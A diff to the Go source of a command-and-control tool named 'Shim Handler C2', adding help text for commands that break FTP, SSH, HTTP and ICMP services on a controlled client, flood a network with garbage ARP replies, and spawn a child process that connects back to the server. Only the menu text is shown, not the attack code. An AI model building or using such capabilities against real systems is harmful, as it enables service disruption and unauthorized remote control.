@@ -443,18 +443,43 @@ func displayHelp(cmd string) {
 		fmt.Println(
 			"Usage: kill [client id]",
 		)
+	case "break":
+		fmt.Printf(
+			"Usage: break [service]\n" +
+				"Possible services:\n" +
+				"icmp\n" +
+				"icmp.out\n" +
+				"ftp\n" +
+				"ftp.alter-config\n" +
+				"ftp.move-config\n" +
+				"ftp.break-service\n" +
+				"http\n" +
+				"ssh\n" +
+				"ssh.alter-config\n" +
+				"ssh.move-config\n" +
+				"ssh.break-service\n",
+		)
+	case "cmd":
+		fmt.Printf(
+			"Usage: cmd [function]\n" +
+				"Possible functions:\n" +
+				"arp	Sends garbage arp replies to every device on the network\n" +
+				"child	Spawns an unencoded child process that connects to the server\n",
+		)
 	default:
 		fmt.Printf(
 			"-----Shim Handler C2: Made by Michael Burke-----\n" +
 				"Commands: \n" +
-				"set  [options]		Set attributes. run \"set help\" for more info.\n" +
-				"get  [options]		Get attributes. run \"get help\" for more info.\n" +
-				"kill [id]		Kill a session\n" +
-				"send [command]		Send a command to the active client\n" +
+				"break [service]		Break a service on the active client\n" +
+				"cmd   [function]	Execute a function on the active client\n" +
+				"set   [options]		Set attributes. Run \"set help\" for more info.\n" +
+				"get   [options]		Get attributes. Run \"get help\" for more info.\n" +
+				"kill  [id]		Kill a session\n" +
+				"send  [command]		Send a command to the active client\n" +
 				"enter			Enter a terminal session with the active client\n" +
 				"leave			Leave the active terminal session\n" +
 				"exit			Exit the application\n" +
-				"help			Display the help menu\n",
+				"help  [command]		Display the help menu\n",
 		)
 		// TODO add help for kill
 		// TODO add name function
